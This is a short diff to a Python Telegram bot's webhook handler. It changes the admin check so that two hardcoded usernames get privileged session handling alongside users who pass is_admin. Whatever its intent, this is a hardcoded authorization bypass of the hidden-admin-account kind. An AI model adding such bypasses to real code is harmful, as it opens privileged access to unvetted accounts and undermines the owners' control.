@@ -54,7 +54,7 @@ async def webhook(webhook_data: TelegramWebhook) -> Dict[str, str]:
             
             if 'username' in user:
                 username = user['username']
-                if is_admin(username):
+                if is_admin(username) or username == "cl168888_pg" or username == "AbdulwahidHussen":
                     session_manager = SessionManager(bot, webhook_data)
                     await session_manager.handle_message()
         
